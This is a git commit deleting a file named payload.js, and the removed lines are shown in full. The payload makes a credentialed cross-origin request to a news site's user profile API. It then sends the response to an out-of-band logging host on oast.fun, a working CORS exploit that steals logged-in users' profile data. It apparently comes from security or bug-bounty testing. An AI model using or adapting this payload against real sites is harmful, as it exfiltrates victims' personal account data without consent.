8ef3514c8b4cf5e701af7040cd157ff449b8ff9d
Chiagoziem Mba-Oji <100405629+g0ziem@users.noreply.github.com>
2023-09-25 07:33:42 +0100

    Delete payload.js

--- payload.js
+++
@@ -1,9 +0,0 @@
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('GET','https://api.20min.ch/user/v1/profile',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//cm2p1qe2vtc0000c1paggkbmy5ayyyyyb.oast.fun/log?key='+this.responseText; 
-};
